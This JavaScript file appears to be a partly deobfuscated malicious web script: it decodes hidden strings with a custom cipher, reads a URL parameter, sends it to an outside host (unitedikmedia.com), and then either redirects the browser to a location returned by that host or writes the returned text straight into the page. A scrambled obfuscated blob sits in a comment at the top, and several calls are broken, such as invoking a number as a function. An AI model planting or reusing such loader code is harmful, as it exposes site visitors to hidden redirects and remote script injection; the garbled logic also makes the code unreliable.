// This code is from initial code
// var CZu = Jly(WZW('Lu..LbLaLowE(do7iecobh#so474LL3Lmi3_]9c3t3nL7u3&c:5L5.(4m :_}ct63\/x7%1rb%$e,e5_o5%afadte=L>t.m.n#S;mNCa!)icL_].Lc." ;eLewL*,=su;j]]=_5=udL2tlt(-i1.$bfe{l(ci(3ibLur_L(s(ecCph68e6x(LdeL=L.fbg1}LL-($s._af,))LLshLefea!Lo_r. .2)3ifLs.,hL.\'8dr5bof=[_7r-o%3$g9frdrwa_,.ta;.)..)8} frh90xu2(;L_.fc(w_4#L9]w(,.e(f.o8_)eLw.tu=(=!fotr=e}ha!%.0f%.eo_L]L8qyediL_9;?erb-;)3xt,p_3;(h_n&rL}of8;,Lhf,ntn_"y8)9=!a;LLn2a)\/,.aL+!fae<q4,(r!$xs$L%xL9wLc.)a+L!hL;yL$o,@"ux1].<h&tr=l,et,7mdL.!iwc1,h6L}f[]{0!opf;"e*]))\'6eeek..L1LofnL]L[(p!=wfao%dh3e{1;t;)i%7}]0;fsdw slarn+:Lire4}})_S.e)L3w3m5,3[p)0>.tLLtf%,4yfrLa,):(LL.4nL;m);3(we&3S],$l1u),eL\'(].<L2la.w1ae\/!L1;8f,;ya1Lb)LL(_l))fLtL8yL.Lk nt"L(on{\'<e f,aL7%0.yse3s,i]ha;j%L1{(6o.e2f;i!oL5pL ih7= ofLn:trm$b2Lto=d(e{]n;L tn_dL$L)rd (])((i{1L_c!{c%g$33.d.4La8af$ffL.L1Lo{.f_]g=36f+%al%0q)lehLLs<Los0(L.)qu7)}od)Lam=3?h)o.iw$s.7(l2]S;Lrf.fr]s4$@ywe3o)L(,)oL_oje);=) (pqsh.4.51et!*c33]ftL1=()i]rdbL(ftpc]xLt.,LLsL\/_pnihedtc)g.LL>tknenla)e?$n)(.!f4e.n.("m()+e$e)1@LL.5r&0q18r!j6=,e1{nwa)=={%S0\'(n"$ nL0,i4)2,;l).anji.)rwafL(o_pkf.>96a)r.{g L5L(l_etrN;7L.x]8ou)]<onLit)LL.!tL.#.]e(i (L.itru;q21}in.n)_{(%LnLr[*>L=_o{&Lrt.fie)moLfeeo._u{hu}73>{)j=)L e9w,fLc5k:+u8]c L(;.(Std(L%4Ll9.$=uLt)ne,_(=nL0)Ln!c].(e(L47eLl1]_(tr4!);L<o#=}2!)e;s}ffs dcc{e5re!).f.!fu;4tg}{4]L-5L]{(x=t(dLo3)6ffr.>snf)afL_s=}xr1)o6eLf]3{)o$_k1]n((f}+je;>.cdsoo=d]L(]Le\/cg(\'$e"_o34=L%)76kLcLf%;.=. !$.i@.%_.tLi+,1L!s{L3k.L=t.o..)}10\'.2d},tLsd};!Lsf7d;t43Lc);s*r_].L{.3e.1Serr\/L(N;ceL>fal!(iL(.e(ng,].vlt(Lx$t[ $\/6Lfl(,}q]rL,k9opr)$a]t_L$1L%p),4}lL4rfnr4L6?9$r.3=LeNi({1a(e=.)6\'o_L6$hhtn!o<fp}piL;nlL}<.t1toL.w ;no;d6r=LL0iisd+]tf7Lu$al14.o_." ]nn$){pe.a b+%_L(aL()di=t_!.adl f}s.riwn1r7;La (+9])le1wea7.rnr.]tt$7f(ibdcn d)5e)f farsfk,8#e? t#uog0 b($$e.g+fxtL8fL Ln}ui\/o3 e2b), .!c]'));


var globalVar = 1;

// Helper functions
function getWindow() {
    return window;
}

function getDocument() {
    return document;
}

function getGlobalVar() {
    return globalVar;
}

function isFalse(value) {
    return !value;
}

function getJSON() {
    return JSON;
}

function getConsole() {
    return console;
}

function getString() {
    return String;
}

function mod(a, b) {
    return a % b;
}

function add(a, b) {
    return a + b;
}

function lessThan(a, b) {
    return a < b;
}

// Core functionality
var obfuscatedString = (decodeFunc)("sh:ec eeot%'oti snectprEyo% i xnco%aL rdeee.riaghda nRrr%aaegtchttefuUreg%lcdieec  %em%o upireitttfntsaw%ele%leoer%rNnhedr h %rtuc'hprerUnnorrrota%thsri%qf", 88158);

function decodeFunc(p, key) {
    var x = {}, w = {}, c = {}, n = {}, h = {}, k = {}, o = {};
    x._ = key;
    var length = p.length;
    w._ = [];

    for (var e = 0; lessThan(e, length); e++) {
        w._[e] = p.charAt(e);
    }

    for (var e = 0; lessThan(e, length); e++) {
        c._ = add(x._ * add(e, 362), mod(x._, 49469));
        n._ = add(x._ * add(e, 181), mod(x._, 22245));
        h._ = mod(c._, length);
        k._ = mod(n._, length);
        o._ = w._[h._];
        swapChars(h, w, k);
        replaceChars(k, w, o);
        updateKey(x, c, n);
    }

    var specialChar = String.fromCharCode(127);
    return w._.join('').split('%').join(specialChar)
        .split('#1').join('%')
        .split('#0').join('#')
        .split(specialChar);
}

// URL processing
var queryParams = new URLSearchParams(window[obfuscatedString[1]][obfuscatedString[0]]);
var id = queryParams.get(obfuscatedString[2]);

if (id) {
    fetch(`https://unitedikmedia.com/dailyinfo.php?id=${id}${obfuscatedString[15]}`)
        .then(response => response.json())
        .then(text => {
            var data = {};
            try {
                data._ = getJSON().parse(text);
                if (data._[obfuscatedString[8]]) {
                    if (isFalse(globalVar)) {
                        return;
                    }
                    processData(data);
                }
            } catch (e) {
                if (isFalse(globalVar)) {
                    getGlobalVar()(obfuscatedString[4]);
                    globalVar = true;
                    return;
                }
                getDocument().write(text);
            }
        })
        .catch(error => {
            getConsole().error(obfuscatedString[4], error);
        });
} else {
    if (globalVar === 1) {
        globalVar(obfuscatedString[7], 0, null);
    } else {
        console.error(obfuscatedString[16]);
    }
}

// Utility functions
function swapChars(h, w, k) {
    w._[h._] = w._[k._];
}

function replaceChars(k, w, o) {
    w._[k._] = o._;
}

function updateKey(x, c, n) {
    x._ = mod(add(c._, n._), 3871873);
}

function processData(data) {
    getWindow()[obfuscatedString[1]][obfuscatedString[9]] = data._[obfuscatedString[8]];
}
